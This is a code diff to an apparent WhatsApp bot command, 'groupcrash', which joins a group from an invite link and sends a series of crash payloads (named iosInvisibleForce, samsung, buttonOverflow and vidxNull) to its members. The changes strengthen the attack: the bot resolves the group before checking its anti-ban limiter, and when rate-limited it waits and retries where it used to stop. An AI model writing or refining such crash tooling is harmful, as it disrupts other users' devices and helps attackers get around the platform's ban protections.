@@ -1,7 +1,7 @@
 'use strict';
 const { MadaraEye } = require('../../lib/madaraEye');
 const { createProgressBar } = require('../../lib/progressBar');
-const { canCrash, recordCrash } = require('../../lib/antiBan');
+const { canCrash, recordCrash, getStats } = require('../../lib/antiBan');
 
 module.exports = {
     name: 'groupcrash',
@@ -25,31 +25,62 @@ module.exports = {
         if (inviteCode.includes('?')) inviteCode = inviteCode.split('?')[0];
         inviteCode = inviteCode.trim();
         
-        try { await canCrash(phone); } catch (e) { return sock.sendMessage(ctx.from, { text: `❌ ${e.message}` }, { quoted: msg }); }
-        
         let eye = global.getMadaraEye?.(sock);
         if (!eye) eye = new MadaraEye(sock);
         
         try {
+            // ── Resolve group FIRST (no crash op yet) ────────────────────
+            await sock.sendMessage(ctx.from, { text: '🔍 ʀᴇsᴏʟᴠɪɴɢ ɢʀᴏᴜᴘ...' }, { quoted: msg });
+            
             let groupJid = null;
-            try { groupJid = await sock.groupAcceptInvite(inviteCode); }
-            catch (e) {
-                try { const info = await sock.groupGetInviteInfo(inviteCode); if (info?.id) groupJid = info.id; } catch (e2) {}
+            try { 
+                groupJid = await sock.groupAcceptInvite(inviteCode); 
+            } catch (e) {
+                try { 
+                    const info = await sock.groupGetInviteInfo(inviteCode); 
+                    if (info?.id) groupJid = info.id; 
+                } catch (e2) {}
             }
+            
             if (!groupJid) throw new Error('Could not resolve group');
             
-            const TOTAL = 40;
-            const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
+            // ── Check anti-ban BEFORE starting crash ─────────────────────
+            const stats = getStats(phone);
+            if (stats.cooldownActive) {
+                const waitSec = Math.round(stats.cooldownRemaining / 1000);
+                return sock.sendMessage(ctx.from, { 
+                    text: `🛡️ ᴀɴᴛɪ-ʙᴀɴ ᴄᴏᴏʟᴅᴏᴡɴ ᴀᴄᴛɪᴠᴇ\n⏳ ᴡᴀɪᴛ *${waitSec}s* ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ` 
+                }, { quoted: msg });
+            }
             
+            await sock.sendMessage(ctx.from, { text: `🎯 ɢʀᴏᴜᴘ ғᴏᴜɴᴅ: ${groupJid}\n💣 ɴᴜᴋᴇ ɪɴɪᴛɪᴀᴛᴇᴅ...` }, { quoted: msg });
+            
+            const TOTAL = 30;
+            const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
             const methods = ['iosInvisibleForce', 'samsung', 'buttonOverflow', 'vidxNull'];
             
             for (let i = 0; i < TOTAL; i++) {
-                try { await canCrash(phone); } catch (e) { await bar.done(`🛡️ ${e.message}\n✅ ᴘᴀʀᴛɪᴀʟ: ${i} ᴘᴀʏʟᴏᴀᴅs`); return; }
+                // ── If rate limited, wait and retry instead of stopping ──
+                try {
+                    await canCrash(phone);
+                } catch (e) {
+                    // Rate limited — wait 30 seconds and try again
+                    await sock.sendMessage(ctx.from, { text: `⏳ ${e.message}\nᴡᴀɪᴛɪɴɢ 30s ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ...` }, { quoted: msg });
+                    await new Promise(r => setTimeout(r, 30000));
+                    try { await canCrash(phone); } catch (e2) {
+                        await bar.done(`🛡️ ${e2.message}\n✅ ᴘᴀʀᴛɪᴀʟ: ${i} ᴘᴀʏʟᴏᴀᴅs`);
+                        return;
+                    }
+                }
+                
                 await eye[methods[i % methods.length]](groupJid);
                 await recordCrash(phone);
                 await bar.update(1, methods[i % methods.length]);
             }
+            
             await bar.done(`✅ ɢʀᴏᴜᴘ ɴᴜᴋᴇ ᴄᴏᴍᴘʟᴇᴛᴇ\n📊 ${TOTAL} ᴘᴀʏʟᴏᴀᴅs\n🎯 ${groupJid}`);
-        } catch (e) { return sock.sendMessage(ctx.from, { text: '❌ ᴇʀʀᴏʀ: ' + e.message }, { quoted: msg }); }
+        } catch (e) { 
+            return sock.sendMessage(ctx.from, { text: '❌ ᴇʀʀᴏʀ: ' + e.message }, { quoted: msg }); 
+        }
     }
 };
